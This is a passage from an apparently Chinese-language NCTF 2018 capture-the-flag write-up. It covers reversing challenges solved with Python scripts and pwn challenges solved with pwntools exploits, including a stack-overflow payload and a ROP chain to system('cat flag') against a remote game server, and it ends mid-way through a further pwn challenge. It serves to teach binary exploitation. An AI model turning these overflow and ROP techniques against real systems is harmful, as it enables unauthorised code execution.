<p>这个函数是输入字符串，也就是接受flag，接着判断字符串的长度，flag的长度必须为35，若不是则输出”error“、退出，接着往下执行程序会进入sub_100F9</p>
<figure class="highlight tcl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">seg001:<span class="number">0059</span> sub_100F9       <span class="keyword">proc</span><span class="title"> near</span>               ;<span class="title"> CODE</span> XREF:<span class="title"> sub_100AC+1A↑p</span></span><br><span class="line"><span class="title">seg001:0059</span> <span class="title">                mov</span> <span class="title">    bx,</span> di</span><br><span class="line">seg001:005B<span class="title">                 mov</span> <span class="title">    si,</span> 0</span><br><span class="line">seg001:005E</span><br><span class="line">seg001:005E<span class="title"> loc_100FE:</span>                              ;<span class="title"> CODE</span> XREF:<span class="title"> sub_100F9+19↓j</span></span><br><span class="line"><span class="title">seg001:005E</span> <span class="title">                mov</span> <span class="title">    al,</span> [bx+si]</span><br><span class="line">seg001:0060<span class="title">                 mov</span> <span class="title">    dl,</span> al</span><br><span class="line">seg001:0062<span class="title">                 mov</span> <span class="title">    cl,</span> 3</span><br><span class="line">seg001:0064<span class="title">                 shr</span> <span class="title">    al,</span> cl</span><br><span class="line">seg001:0066<span class="title">                 mov</span> <span class="title">    cl,</span> 5</span><br><span class="line">seg001:0068<span class="title">                 shl</span> <span class="title">    dl,</span> cl</span><br><span class="line">seg001:006A<span class="title">                 xor</span> <span class="title">    al,</span> dl</span><br><span class="line">seg001:006C<span class="title">                 mov</span>     [bx+si],<span class="title"> al</span></span><br><span class="line"><span class="title">seg001:006E</span> <span class="title">                inc</span> <span class="title">    si</span></span><br><span class="line"><span class="title">seg001:006F</span> <span class="title">                cmp</span> <span class="title">    si,</span> 23h ; '#'</span><br><span class="line">seg001:0072<span class="title">                 jnz</span> <span class="title">    short</span> loc_100FE</span><br><span class="line">seg001:0074<span class="title">                 retn</span></span><br><span class="line"><span class="title">seg001:0074</span> sub_100F9<span class="title">       endp</span></span><br></pre></td></tr></table></figure>
<p>这个函数是对输入的字符串处理，处理规则是”(flag[i]&gt;&gt;3)^(flag[i]&lt;&lt;\5)”，然后执行sub_100E4函数</p>
<figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">seg001:</span><span class="number">0046</span> loc_100E6:                              <span class="comment">; CODE XREF: sub_100E4+B↓j</span></span><br><span class="line"><span class="symbol">seg001:</span><span class="number">0046</span>                 <span class="keyword">mov</span>     <span class="built_in">al</span>, [<span class="built_in">bx</span>+<span class="built_in">si</span>]</span><br><span class="line"><span class="symbol">seg001:</span><span class="number">0048</span>                 <span class="keyword">cmp</span>     <span class="built_in">al</span>, [<span class="built_in">bx</span>+<span class="built_in">di</span>]</span><br><span class="line"><span class="symbol">seg001:</span>004A                 <span class="keyword">jnz</span>     short loc_100F5</span><br><span class="line"><span class="symbol">seg001:</span>004C                 <span class="keyword">inc</span>     <span class="built_in">bx</span></span><br><span class="line"><span class="symbol">seg001:</span><span class="number">004D</span>                 <span class="keyword">cmp</span>     <span class="built_in">bx</span>, <span class="built_in">dx</span></span><br><span class="line"><span class="symbol">seg001:</span>004F                 <span class="keyword">jnz</span>     short loc_100E6</span><br><span class="line"><span class="symbol">seg001:</span><span class="number">0051</span>                 <span class="keyword">mov</span>     <span class="built_in">ax</span>, <span class="number">0</span></span><br><span class="line"><span class="symbol">seg001:</span><span class="number">0054</span>                 <span class="keyword">retn</span></span><br><span class="line"><span class="symbol">seg001:</span><span class="number">0055</span> <span class="comment">; ---------------------------------------------------------------------------</span></span><br><span class="line"><span class="symbol">seg001:</span><span class="number">0055</span></span><br><span class="line"><span class="symbol">seg001:</span><span class="number">0055</span> loc_100F5:                              <span class="comment">; CODE XREF: sub_100E4+6↑j</span></span><br><span class="line"><span class="symbol">seg001:</span><span class="number">0055</span>                 <span class="keyword">mov</span>     <span class="built_in">ax</span>, <span class="number">1</span></span><br><span class="line"><span class="symbol">seg001:</span><span class="number">0058</span>                 <span class="keyword">retn</span></span><br><span class="line"><span class="symbol">seg001:</span><span class="number">0058</span> sub_100E4       endp</span><br></pre></td></tr></table></figure>
<p>这个函数是讲处理过的flag与程序中的数据进行比较，若匹配，则是正确的flag，若不正确，则错误<br></p>
<p>根据目前我们得到的信息，我们可以通过程序给定的对比的字符串反推出flag，解题脚本如下：</p>
<figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">#coding:utf-<span class="number">8</span></span><br><span class="line">current = [<span class="number">0xC9</span>,<span class="number">0x68</span>,<span class="number">0x8A</span>,<span class="number">0xC8</span>,<span class="number">0x6F</span>,<span class="number">0x7</span>,<span class="number">0x6</span>,<span class="number">0xF</span>,<span class="number">0x7</span>,<span class="number">0xC6</span>,<span class="number">0xEB</span>,<span class="number">0x86</span>,<span class="number">0x6E</span>,<span class="number">0x6E</span>,<span class="number">66</span>,<span class="number">0xAD</span>,<span class="number">0x4C</span>,<span class="number">0x8D</span>,<span class="number">0xAC</span>,<span class="number">0xEB</span>,<span class="number">0x26</span>,<span class="number">0x6E</span>,<span class="number">0xEB</span>,<span class="number">0xCC</span>,<span class="number">0xAE</span>,<span class="number">0xCD</span>,<span class="number">0x8C</span>,<span class="number">0x86</span>,<span class="number">0xAD</span>,<span class="number">0x66</span>,<span class="number">0xCD</span>,<span class="number">0x8E</span>,<span class="number">0x86</span>,<span class="number">0x8D</span>,<span class="number">0xAF</span>]</span><br><span class="line">num = <span class="number">0</span></span><br><span class="line">flag = <span class="string">""</span></span><br><span class="line">for y <span class="keyword">in</span> range(len(current)):</span><br><span class="line">	for x <span class="keyword">in</span> range(<span class="number">32</span>,<span class="number">128</span>):</span><br><span class="line">		if ((x&gt;&gt;<span class="number">3</span>)^(x&lt;&lt;<span class="number">5</span>))&amp;<span class="number">0xff</span>==current[y]:</span><br><span class="line">			flag+=chr(x)</span><br><span class="line">			break</span><br><span class="line">print flag</span><br></pre></td></tr></table></figure>
<p>flag：NCTF{80x86_4ssmble_1s_fund4m3nt4l}</p>
<h3 id="基本操作-Reverse-Version"><a href="#基本操作-Reverse-Version" class="headerlink" title="基本操作 ~Reverse Version.~"></a>基本操作 ~Reverse Version.~</h3><p>在终端运行程序是让输入一个flag，然后验证，用IDA载入，查看伪代码</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">__int64 __<span class="function">fastcall <span class="title">main</span><span class="params">(__int64 a1, <span class="keyword">char</span> **a2, <span class="keyword">char</span> **a3)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  __int64 result; <span class="comment">// rax</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"Input flag:"</span>);</span><br><span class="line">  __isoc99_scanf(<span class="string">"%64s"</span>, byte_601100);</span><br><span class="line">  dword_601064 = <span class="number">0</span>;</span><br><span class="line">  sub_400666(<span class="number">0</span>);</span><br><span class="line">  <span class="keyword">if</span> ( !<span class="built_in">strcmp</span>(&amp;s1, <span class="string">"bcec8d7dcda25d91ed3e0b720cbb6cf202b09fedbc3e017774273ef5d5581794"</span>) )<span class="comment">// 先序排列</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">memset</span>(&amp;s1, <span class="number">0</span>, <span class="number">0x80</span>uLL);</span><br><span class="line">    dword_601064 = <span class="number">0</span>;</span><br><span class="line">    sub_4006BE(<span class="number">0</span>, <span class="number">0L</span>L);</span><br><span class="line">    <span class="keyword">if</span> ( !<span class="built_in">strcmp</span>(&amp;s1, <span class="string">"7d8dcdcaed592e1dcb07e02c36bcb2f0bf9e0bdcb0e13777237e25fd48515974"</span>) )<span class="comment">// 中序排列</span></span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">"TQL! TQL! flag: nctf&#123;%s&#125;\n"</span>, byte_601100);</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">"Emmmm....."</span>);</span><br><span class="line">    result = <span class="number">0L</span>L;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"GG!"</span>);</span><br><span class="line">    result = <span class="number">0L</span>L;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>大致一看进行了两次与字符串比较，sub_400666：</p>
<figure class="highlight mipsasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">__int64 __fastcall <span class="keyword">sub_400666(signed </span>int <span class="built_in">a1</span>)</span><br><span class="line">&#123;</span><br><span class="line">  int <span class="built_in">v1</span><span class="comment">; // eax</span></span><br><span class="line">  __int64 result<span class="comment">; // rax</span></span><br><span class="line"></span><br><span class="line">  if ( <span class="built_in">a1</span> &lt;= <span class="number">63</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">v1</span> = dword_601064++<span class="comment">;</span></span><br><span class="line">    *(&amp;<span class="built_in">s1</span> + <span class="built_in">v1</span>) = <span class="keyword">byte_601100[a1];</span></span><br><span class="line"><span class="keyword"> </span>   <span class="keyword">sub_400666(2 </span>* <span class="built_in">a1</span> + <span class="number">1</span>)<span class="comment">;</span></span><br><span class="line">    result = <span class="keyword">sub_400666(2 </span>* (<span class="built_in">a1</span> + <span class="number">1</span>))<span class="comment">;</span></span><br><span class="line">  &#125;</span><br><span class="line">  return result<span class="comment">;</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>利用了递归函数，很明显这是将我们输入的字符串生成了一个二叉树，然后这个是是先序排序，讲生成的序列和第一次if进行比较，若正确，进入sub_4006BE函数</p>
<figure class="highlight mipsasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">__int64 __fastcall <span class="keyword">sub_4006BE(signed </span>int <span class="built_in">a1</span>, __int64 <span class="built_in">a2</span>)</span><br><span class="line">&#123;</span><br><span class="line">  int v2<span class="comment">; // eax</span></span><br><span class="line">  __int64 result<span class="comment">; // rax</span></span><br><span class="line"></span><br><span class="line">  if ( <span class="built_in">a1</span> &lt;= <span class="number">63</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">sub_4006BE(2 </span>* <span class="built_in">a1</span> + <span class="number">1</span>, <span class="built_in">a2</span>)<span class="comment">;</span></span><br><span class="line">    v2 = dword_601064++<span class="comment">;</span></span><br><span class="line">    *(&amp;<span class="built_in">s1</span> + v2) = <span class="keyword">byte_601100[a1];</span></span><br><span class="line"><span class="keyword"> </span>   result = <span class="keyword">sub_4006BE(2 </span>* (<span class="built_in">a1</span> + <span class="number">1</span>), <span class="built_in">a2</span>)<span class="comment">;</span></span><br><span class="line">  &#125;</span><br><span class="line">  return result<span class="comment">;</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>这个函数是生成中序排序，将生成的字符串进行第二次if比较，如果正确的话，则我们输入的就是flag，分析一波发现二叉树生成的时候不是按照大小排序的，而是按照顺序排序的，那么我们就可以通过给出的字符串反推出flag，脚本如下：</p>
<figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">text  = <span class="string">"abcdefghijklmnopqrstuvwxyzABCDEFJHIJKLMNOPQRSTUVWXYZ0123456789#@"</span></span><br><span class="line"></span><br><span class="line">ciper = <span class="string">"abdhpF@JqHIirJKsLMejtNOuPQkvRSwTUcflxVWyXYmzZ0A12gnB34C56oD78E9#"</span></span><br><span class="line"><span class="built_in">index</span> = []</span><br><span class="line"><span class="keyword">for</span> <span class="keyword">x</span> in <span class="built_in">range</span>(<span class="built_in">len</span>(text)):</span><br><span class="line">	<span class="built_in">index</span>.<span class="keyword">append</span>(ciper.<span class="built_in">index</span>(text[<span class="keyword">x</span>]))</span><br><span class="line">#[<span class="number">0</span>, <span class="number">1</span>, <span class="number">3</span>, <span class="number">7</span>, <span class="number">15</span>, <span class="number">31</span>, <span class="number">63</span>, <span class="number">32</span>, <span class="number">16</span>, <span class="number">33</span>, <span class="number">34</span>, <span class="number">8</span>, <span class="number">17</span>, <span class="number">32</span>, <span class="number">36</span>, <span class="number">18</span>, <span class="number">37</span>, <span class="number">38</span>, <span class="number">4</span>, <span class="number">9</span>, <span class="number">19</span>, <span class="number">39</span>, <span class="number">40</span>, <span class="number">20</span>, <span class="number">41</span>, <span class="number">42</span>, <span class="number">10</span>, <span class="number">21</span>, <span class="number">43</span>, <span class="number">44</span>, <span class="number">22</span>, <span class="number">45</span>, <span class="number">46</span>, <span class="number">2</span>, <span class="number">5</span>, <span class="number">11</span>, <span class="number">23</span>, <span class="number">47</span>, <span class="number">48</span>, <span class="number">24</span>, <span class="number">49</span>, <span class="number">50</span>, <span class="number">12</span>, <span class="number">25</span>, <span class="number">51</span>, <span class="number">52</span>, <span class="number">26</span>, <span class="number">53</span>, <span class="number">54</span>, <span class="number">6</span>, <span class="number">13</span>, <span class="number">27</span>, <span class="number">55</span>, <span class="number">56</span>, <span class="number">28</span>, <span class="number">57</span>, <span class="number">58</span>, <span class="number">14</span>, <span class="number">29</span>, <span class="number">59</span>, <span class="number">60</span>, <span class="number">30</span>, <span class="number">61</span>, <span class="number">62</span>]</span><br><span class="line"></span><br><span class="line">flag = <span class="string">""</span></span><br><span class="line"><span class="keyword">for</span> <span class="keyword">x</span> in <span class="built_in">range</span>(<span class="built_in">len</span>(<span class="built_in">index</span>)):</span><br><span class="line">	flag += DLR[<span class="built_in">index</span>[<span class="keyword">x</span>]]</span><br><span class="line"><span class="keyword">print</span> <span class="string">"NCTF&#123;"</span>+flag+<span class="string">"&#125;"</span></span><br></pre></td></tr></table></figure>
<p>flag：NCTF{bc2e3b4c2eb03258c5102bf9de77f57dddad9edb70c6c20febc01773e5d81947}</p>
<h2 id="Pwn"><a href="#Pwn" class="headerlink" title="Pwn"></a>Pwn</h2><h3 id="sendyouflag"><a href="#sendyouflag" class="headerlink" title="sendyouflag"></a>sendyouflag</h3><p>IDA载入查看：</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span> __<span class="function">cdecl <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> v1; <span class="comment">// [esp+8h] [ebp-10h]</span></span><br><span class="line">  <span class="keyword">int</span> v2; <span class="comment">// [esp+Ch] [ebp-Ch]</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"WELCOME TO PWN"</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"I WILL SEND YOU FLAG"</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"BUT YOU SHOULD SEND ME SOME 'a'"</span>);</span><br><span class="line">  __isoc99_scanf(<span class="string">"%9s"</span>, &amp;v1);</span><br><span class="line">  <span class="keyword">if</span> ( v2 == <span class="number">1633771873</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"TQL!TQL!"</span>);</span><br><span class="line">    system(<span class="string">"cat flag"</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"HAHA you fool"</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"BYE"</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>首先用户输入一个数字V1，如果V2等于0x61616161的话，则“cat flag”，我们输入V1在[esp+8h]，V2在[esp+Ch]，并且scanf没有限制读取的长度，那么我们就可以进行覆盖掉v2</p>
<p>EXP：</p>
<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn import *</span><br><span class="line">r = remote(<span class="string">"ctfgame.acdxvfsvd.net"</span>,10001)</span><br><span class="line">token = <span class="string">"Wl9anMOc6jNZNZo0H53t448RpcSkRPuU"</span></span><br><span class="line"><span class="builtin-name">print</span> r.recv()</span><br><span class="line">r.sendline(token)</span><br><span class="line"><span class="builtin-name">print</span> r.recv()</span><br><span class="line">payload = <span class="string">"a"</span><span class="number">*8</span></span><br><span class="line">r.sendline(payload)</span><br><span class="line"><span class="builtin-name">print</span> r.recvall()</span><br></pre></td></tr></table></figure>
<p>flag: NCTF{a1c5d9a03180782ba437ace38b33112b759807712b36e76d99f07366e9cb39e6}</p>
<h3 id="sendyousomething"><a href="#sendyousomething" class="headerlink" title="sendyousomething"></a>sendyousomething</h3><p>伪代码：</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">__int64 __<span class="function">fastcall <span class="title">main</span><span class="params">(__int64 a1, <span class="keyword">char</span> **a2, <span class="keyword">char</span> **a3)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> v4; <span class="comment">// [rsp+Ch] [rbp-14h]</span></span><br><span class="line">  <span class="keyword">char</span> buf; <span class="comment">// [rsp+10h] [rbp-10h]</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 v6; <span class="comment">// [rsp+18h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v6 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"WELCOME TO PWN"</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"I WILL SEND YOU FLAG"</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"BUT YOU SHOULD SEND ME A ROP"</span>);</span><br><span class="line">  read(<span class="number">0</span>, &amp;buf, <span class="number">0x100</span>uLL);</span><br><span class="line">  <span class="keyword">if</span> ( v4 == <span class="number">1633771873</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"TQL!TQL!"</span>);</span><br><span class="line">    system(<span class="string">"cat flag"</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"HAHA you fool"</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"BYE"</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0L</span>L;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>checksec一下：</p>
<figure class="highlight groovy"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">wxm<span class="meta">@wxm</span>-<span class="string">PC:</span>~/Desktop$ checksec  sendyousomething</span><br><span class="line"><span class="string">CANARY    :</span> ENABLED</span><br><span class="line"><span class="string">FORTIFY   :</span> disabled</span><br><span class="line"><span class="string">NX        :</span> ENABLED</span><br><span class="line"><span class="string">PIE       :</span> disabled</span><br><span class="line"><span class="string">RELRO     :</span> Partial</span><br></pre></td></tr></table></figure>
<p>该程序开启了NX栈不可执行，CANARY栈保护，然后我们测试程序，运行发现让输入字符串，我们输入过长的字符串后，程序会返回段错误，然后我们动态调试发现当我们输入过长的字符串的时候，程序执行到leave的时候，我们输入过长的字符串会讲ebp控制，从而可以控制esp，程序中存在system函数，并且存在“cat flag”字符串，我们就可以劫持程序的流程到这个system上面去；</p>
<p>EXP：</p>
<figure class="highlight makefile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line"><span class="comment">#r = process("sendyousomething")</span></span><br><span class="line">r = remote(<span class="string">"ctfgame.acdxvfsvd.net"</span>,10002)</span><br><span class="line">r_elf = ELF(<span class="string">"sendyousomething"</span>)</span><br><span class="line">offset = 29</span><br><span class="line">token = <span class="string">"Wl9anMOc6jNZNZo0H53t448RpcSkRPuU"</span></span><br><span class="line">print r.recv()</span><br><span class="line">r.sendline(token)</span><br><span class="line">system_addr = 0x4004f0</span><br><span class="line">pop_rdi = 0x400723</span><br><span class="line"></span><br><span class="line">payload = <span class="string">"a"</span>*24+p64(pop_rdi)+p64(0x40078e)+p64(system_addr)</span><br><span class="line">print r.recv()</span><br><span class="line">r.sendline(payload)</span><br><span class="line">print r.recvall()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">out：</span><br><span class="line"><span class="section">wxm@wxm-PC:~/Desktop$ python getflag.py </span></span><br><span class="line">[+] Opening connection to ctfgame.acdxvfsvd.net on port 10002: Done</span><br><span class="line">[*] '/home/wxm/Desktop/sendyousomething'</span><br><span class="line">    Arch:     amd64-64-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    Canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE (0x400000)</span><br><span class="line">Your Token:</span><br><span class="line"></span><br><span class="line">WELCOME TO PWN</span><br><span class="line">I WILL SEND YOU FLAG</span><br><span class="line">BUT YOU SHOULD SEND ME A ROP</span><br><span class="line"></span><br><span class="line">[+] Receiving all data: Done (89B)</span><br><span class="line">[*] Closed connection to ctfgame.acdxvfsvd.net port 10002</span><br><span class="line">HAHA you fool</span><br><span class="line">BYE</span><br><span class="line">NCTF&#123;407d4c9b48fab10e561272b3416434588baf64089594703c10a619861ed8f20d&#125;</span><br></pre></td></tr></table></figure>
<p>flag：NCTF{407d4c9b48fab10e561272b3416434588baf64089594703c10a619861ed8f20d}</p>
<h3 id="SMALL-bug-I"><a href="#SMALL-bug-I" class="headerlink" title="SMALL bug I"></a>SMALL bug I</h3><p>checksec:</p>
<figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">pwndbg&gt;</span> <span class="string">checksec</span></span><br><span class="line"><span class="string">[*]</span> <span class="string">'/media/wxm/Lenovo/study/ctf/2018-11-24/2018nctf/pwn/bug1_d96e92d3f6aff2674ea2673afd1d15d9'</span></span><br><span class="line"><span class="attr">    Arch:</span>     <span class="string">amd64-64-little</span></span><br><span class="line"><span class="attr">    RELRO:</span>    <span class="string">Partial</span> <span class="string">RELRO</span></span><br><span class="line"><span class="attr">    Stack:</span>    <span class="literal">No</span> <span class="string">canary</span> <span class="string">found</span></span><br><span class="line"><span class="attr">    NX:</span>       <span class="string">NX</span> <span class="string">enabled</span></span><br><span class="line"><span class="attr">    PIE:</span>      <span class="literal">No</span> <span class="string">PIE</span> <span class="string">(0x400000)</span></span><br><span class="line"></span><br><span class="line"><span class="string">pwndbg&gt;</span></span><br></pre></td></tr></table></figure>
<p>发现仅仅开启了NX保护（栈不可执行）</p>
<p>载入ida中查看程序大致流程：</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span> __<span class="function">fastcall <span class="title">main</span><span class="params">(__int64 a1, <span class="keyword">char</span> **a2, <span class="keyword">char</span> **a3)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> result; <span class="comment">// eax</span></span><br><span class="line"></span><br><span class="line">  setbuf(<span class="built_in">stdin</span>, <span class="number">0L</span>L);</span><br><span class="line">  setbuf(<span class="built_in">stdout</span>, <span class="number">0L</span>L);</span><br><span class="line">  setbuf(<span class="built_in">stderr</span>, <span class="number">0L</span>L);</span><br><span class="line">  sub_400766();             <span class="comment">//第一次输入</span></span><br><span class="line">  sub_4007AC();             <span class="comment">//第二次输入</span></span><br><span class="line">  result = dword_60108C;</span><br><span class="line">  <span class="keyword">if</span> ( dword_60108C )       <span class="comment">//执行“cat flag”的条件</span></span><br><span class="line">    result = system(<span class="string">"cat flag"</span>);</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>执行两次输入，判断dword_60108C的真假，执行“system”，接着细看两次输入函数：</p>
<p>第一次输入：<br><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-class">.text</span><span class="selector-pseudo">:0000000000400766</span>                 <span class="selector-tag">push</span>    <span class="selector-tag">rbp</span></span><br><span class="line"><span class="selector-class">.text</span><span class="selector-pseudo">:0000000000400767</span>                 <span class="selector-tag">mov</span>     <span class="selector-tag">rbp</span>, <span class="selector-tag">rsp</span></span><br><span class="line"><span 